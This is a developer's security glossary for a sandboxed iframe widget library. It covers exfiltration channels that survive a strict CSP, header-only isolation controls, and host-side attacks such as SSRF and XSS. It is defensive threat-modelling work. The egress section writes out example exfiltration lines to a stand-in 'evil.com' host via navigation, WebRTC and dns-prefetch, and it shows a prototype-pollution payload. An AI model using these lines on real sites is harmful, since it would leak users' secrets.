# Security glossary (browser terms → backend analogies)

Mental model: the widget iframe is a locked-down container under a strict seccomp profile. CSP `default-src 'none'` = blocking `connect()`/`sendto()`. Every "egress channel" below = a syscall the profile forgot.

## Egress channels that survive `default-src 'none'`
- **Self-navigation** — `location = "https://evil/?d="+secret`. A page-load, not a fetch; CSP doesn't cover it (`navigate-to` never shipped).
- **WebRTC** — `RTCPeerConnection` with `iceServers: stun:<secret>.evil.com` does a DNS+UDP probe. Separate network stack; needs the separate `webrtc` CSP directive.
- **DNS-prefetch / preconnect** — `<link rel="dns-prefetch" href="//<secret>.evil.com">`. The hostname IS the message. = classic DNS exfiltration. No CSP directive.
- **Speculation rules / prefetch** — preload hint pointed at attacker URL.
- **Widget's own `<meta>` CSP `report-uri`** — widget's self-inflicted policy sends violation reports (with the secret in the blocked-uri) to attacker. → we must own the whole `<head>`; stripping widget meta tags is SECURITY not hygiene.
- **`window.parent.postMessage`** — hits any other `message` listener on the host page (analytics/chat SDKs). Shared-bus leak, not network.
- Consequence: several need ZERO capabilities → read-only is containment (bounds blast radius to own-data), not prevention. Attack suite must test at DNS/socket layer, not just HTTP.

## Header-only controls a frontend lib can't set (the server question)
- CSP delivered 2 ways: HTTP response header vs `<meta>` tag. Some directives are header-only.
- **`frame-src`** (header, on the PARENT page) — the one control that stops child-frame self-navigation. We live inside the page; can't set it, can't even read whether the app set it.
- **COOP / COEP** — headers that enable cross-origin isolation → out-of-process iframe (real process boundary; contains infinite loops / exploits).
- Analogy: enforcing a k8s NetworkPolicy from INSIDE the container. Load-bearing isolation is set in the pod spec (app + its server), not the container (our JS lib). → minimal "server" = require the app to send 2–3 response headers; no marzi backend, no data path through us.

## Host-side attacks (ordinary web security — backend turf)
- **SSRF / IDOR / path traversal** — schema-valid string ≠ safe-to-interpolate string. HTTP adapter needs per-slot encoding, host allowlist, no routing from interpolated values. The "client" is model-written = always hostile.
- **Prototype pollution** — `{"__proto__":{...}}` in structured-clone params poisons every object. JS cousin of unsafe deserialization. Fix: null-prototype incoming params.
- **XSS via consent sheet** — model-authored widget name/description rendered unescaped in the HOST origin = total compromise. Fix: HTML-escape all model text.

## Durability / ops ideas
- **Store-body-only, recompose-at-render** — persist model HTML only; rebuild jail wrapper from current lib version each render → security fixes reach all stored widgets, no migration.
- **Hash-bound grants = consent freshness, NOT tamper-proofing** — code+grant share the store, so an attacker rewrites both; the hash only forces re-consent when code changes so grants can't attach to unseen code.
- **Caveats as attenuation** — store restrictions in the grant (macaroons/scoped tokens); only a FIXED caveat vocabulary is soundly checkable.
- **Capability versioning** — bump to invalidate old grants (API versioning + forced re-auth).
- **Output pruning** — strip capability results to declared fields before they enter the frame.
